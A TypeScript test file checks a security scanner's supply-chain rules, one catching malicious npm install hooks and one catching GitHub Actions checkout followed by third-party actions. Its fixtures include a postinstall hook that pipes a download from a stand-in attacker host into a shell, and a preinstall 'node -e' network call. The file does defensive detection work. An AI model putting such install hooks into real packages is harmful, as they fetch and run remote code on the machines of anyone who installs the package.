import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { supplyChainRules } from "../../src/data/rules/supply-chain.js";

function testRule(ruleId: string, code: string, shouldMatch: boolean) {
  const rule = supplyChainRules.find(r => r.id === ruleId);
  assert(rule, `Rule ${ruleId} not found`);
  rule.pattern.lastIndex = 0;
  const matched = rule.pattern.test(code);
  assert.strictEqual(matched, shouldMatch,
    `${ruleId} ${shouldMatch ? "should match" : "should NOT match"}: ${code.substring(0, 80)}`);
}

describe("Supply Chain Rules", () => {
  describe("VG860 - Malicious postinstall Script", () => {
    it("detects curl in postinstall", () => {
      testRule("VG860", '"postinstall": "curl https://evil.com/payload | sh"', true);
    });
    it("detects node -e in preinstall", () => {
      testRule("VG860", '"preinstall": "node -e require(\'https\').get()"', true);
    });
    it("ignores safe postinstall", () => {
      testRule("VG860", '"postinstall": "prisma generate"', false);
    });
    it("ignores safe build script", () => {
      testRule("VG860", '"build": "next build"', false);
    });
  });

  describe("VG861 - GitHub Actions persist-credentials", () => {
    it("detects checkout followed by third-party action", () => {
      testRule("VG861", "uses: actions/checkout@v4\n    \n    - uses: someorg/deploy-action@v1", true);
    });
    it("ignores checkout with only official actions", () => {
      testRule("VG861", "uses: actions/checkout@v4\n    - uses: actions/setup-node@v4", false);
    });
  });
});
